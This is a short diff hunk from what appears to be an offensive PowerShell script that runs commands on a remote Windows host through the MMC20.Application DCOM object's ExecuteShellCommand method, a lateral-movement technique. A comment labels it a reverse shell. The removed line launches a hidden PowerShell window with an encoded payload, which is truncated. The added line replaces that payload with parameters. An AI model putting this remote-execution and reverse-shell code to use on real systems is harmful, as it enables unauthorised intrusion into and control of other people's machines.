@@ -20,4 +20,4 @@ $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Appl
 
 # 启动进程
 # revshell
-$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JAB...AD","7")
+$dcom.Document.ActiveView.ExecuteShellCommand($command, $null, $commandParam,"7")
